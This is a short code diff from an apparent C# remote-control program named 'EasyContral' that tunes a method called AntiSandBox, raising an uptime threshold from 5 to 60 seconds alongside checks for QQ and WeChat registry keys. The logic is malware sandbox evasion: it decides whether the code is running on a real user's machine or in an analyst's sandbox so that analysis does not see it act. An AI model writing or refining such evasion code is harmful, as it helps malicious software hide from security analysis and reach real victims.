@@ -181,7 +181,7 @@ namespace EasyContral
         }
         static bool AntiSandBox()
         {
-            int delay = 5;//延迟执行时间
+            int delay = 60;//延迟执行时间
             TimeSpan span = TimeSpan.FromMilliseconds(Environment.TickCount);//系统运行时间
             if (IsRegistryKeyExists(@"SOFTWARE\Tencent\QQ") || IsRegistryKeyExists(@"SOFTWARE\Tencent\WeChat") || span.TotalSeconds < delay)
             {
